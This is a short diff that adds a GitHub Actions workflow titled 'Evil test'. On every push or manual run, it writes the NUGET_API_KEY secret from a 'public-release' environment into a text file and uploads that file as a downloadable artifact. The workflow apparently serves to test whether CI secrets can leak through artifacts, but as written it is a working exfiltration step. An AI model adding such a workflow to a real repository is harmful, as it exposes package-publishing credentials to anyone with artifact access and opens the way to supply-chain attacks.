@@ -1,0 +1,18 @@
+name: Evil test
+on:
+  push:
+  workflow_dispatch:
+jobs:
+  job1:
+    runs-on: ubuntu-latest
+    environment: public-release
+    steps:
+      - run: echo "TEST" >> output.txt
+      - run: echo $TEST >> output.txt
+        env:
+          TEST: ${{secrets.NUGET_API_KEY}}
+      - uses: actions/upload-artifact@v4
+        with:
+          name: Artifact
+          if-no-files-found: error
+          path: output.txt
